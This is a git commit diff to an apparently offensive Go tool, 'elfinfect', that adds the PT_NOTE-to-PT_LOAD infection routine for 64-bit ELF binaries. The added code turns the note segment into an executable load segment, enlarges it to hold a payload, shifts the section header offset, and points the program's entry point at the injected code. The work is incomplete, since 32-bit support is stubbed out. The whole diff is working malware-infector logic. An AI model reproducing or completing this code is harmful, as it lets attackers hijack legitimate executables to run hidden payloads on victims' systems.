e5add49d4b7632386aa381effbd970e3fe885f05
sad0p <sad0p@protonmail.com>
2022-05-15 04:32:22 -0400

    Implementing pt_note algo. Reading headers and modifying appropriate fields with output for testing

--- elfinfect/pt_note_to_pt_load.go
+++ elfinfect/pt_note_to_pt_load.go
@@ -34,19 +34,23 @@ func (t *TargetBin) PtNoteToPtLoadInfection(debug bool, noRestoration bool, noRe
 	var dataSegEndOff interface{}
 	var dataSegEndAddr interface{}
 	//var oShoff interface{}
+
 	var dataNdx int
 	var noteNdx int
 	var dataAlignSize interface{}
 
 	switch t.EIdent.Arch {
 	case elf.ELFCLASS64:
+		oEntry := t.Hdr.(*elf.Header64).Entry
+		//oShoff = t.Hdr.(*elf.Header64).Shoff
+
 		pHeaders := t.Phdrs.([]elf.Prog64)
 		pNum := int(t.Hdr.(*elf.Header64).Phnum)
 		numPtNote := 0
 
-		for pHeaderNdx := 0; pHeaderNdx < pNum; i++ {
-			currentHeaderType := elf.ProgType(pHeaders[i].Type)
-			currentHeaderFlags := elf.ProgFlag(pHeaders[i].Flags)
+		for pHeaderNdx := 0; pHeaderNdx < pNum; pHeaderNdx++ {
+			currentHeaderType := elf.ProgType(pHeaders[pHeaderNdx].Type)
+			currentHeaderFlags := elf.ProgFlag(pHeaders[pHeaderNdx].Flags)
 			if currentHeaderType == elf.PT_NOTE {
 				numPtNote++
 				noteNdx = pHeaderNdx
@@ -61,18 +65,55 @@ func (t *TargetBin) PtNoteToPtLoadInfection(debug bool, noRestoration bool, noRe
 			}
 		}
 
-		dataSegEndOff = pHeaders[dataNdx].Off
+		dataSegEndOff = pHeaders[dataNdx].Off + pHeaders[dataNdx].Filesz
+		dataSegEndAddr = pHeaders[dataNdx].Vaddr + pHeaders[dataNdx].Memsz
 		dataAlignSize = pHeaders[dataNdx].Align
 
 		if debug {
 			fmt.Printf("[+] Data segment pHeader index @ %d\n", dataNdx)
-			fmt.Printf("[+] Data segment file offset @  0x%x\n", dataSegEndOff)
+			fmt.Printf("[+] Data segment file offset ends @  0x%x\n", dataSegEndOff)
+			fmt.Printf("[+] Data segment virtual address ends @ 0x%x\n", dataSegEndAddr)
 			fmt.Printf("[+] Data segment alignment -> 0x%x\n", dataAlignSize)
 			fmt.Printf("[+] PT_NOTE segment pHeader index @ %d\n", noteNdx)
 		}
 
+		if debug {
+			fmt.Println("[+] Converting PT_NOTE to PT_LOAD and setting PERM R-X")
+		}
+
+		t.Phdrs.([]elf.Prog64)[noteNdx].Type = uint32(elf.PT_LOAD)
+		t.Phdrs.([]elf.Prog64)[noteNdx].Flags = uint32(elf.PF_R | elf.PF_X)
+		t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr = dataSegEndAddr.(uint64) + dataAlignSize.(uint64)
+
+		if debug {
+			fmt.Printf("[+] Newly created PT_LOAD virtual address starts at 0x%x\n", t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr)
+		}
+
+		plen := uint64(t.Payload.Len())
+
+		t.Phdrs.([]elf.Prog64)[noteNdx].Filesz += plen
+		t.Phdrs.([]elf.Prog64)[noteNdx].Memsz += plen
+
+		if debug {
+			fmt.Printf("[+] Increased Phdr.Filesz by length of payload (0x%x)\n", plen)
+			fmt.Printf("[+] Increased Phdr.Memsz by length of payload (0x%x)\n", plen)
+		}
+
+		t.Hdr.(*elf.Header64).Shoff += plen
+
+		if debug {
+			fmt.Printf("[+] Increased section header offset from 0x%x to 0x%x to account for payload\n", (t.Hdr.(*elf.Header64).Shoff - plen), t.Hdr.(*elf.Header64).Shoff)
+		}
+
+		t.Hdr.(*elf.Header64).Entry = t.Phdrs.([]elf.Prog64)[noteNdx].Vaddr
+
+		if debug {
+			fmt.Printf("[+] Modifed entry point from 0x%x to 0x%x\n", oEntry, t.Hdr.(*elf.Header64).Entry)
+		}
+
 	case elf.ELFCLASS32:
-		fmt.Println("Got 32bit intel elf binary this far")
+		return errors.New("32 bit support for this alogorithm is not implemented yet")
 	}
+
 	return nil
 }
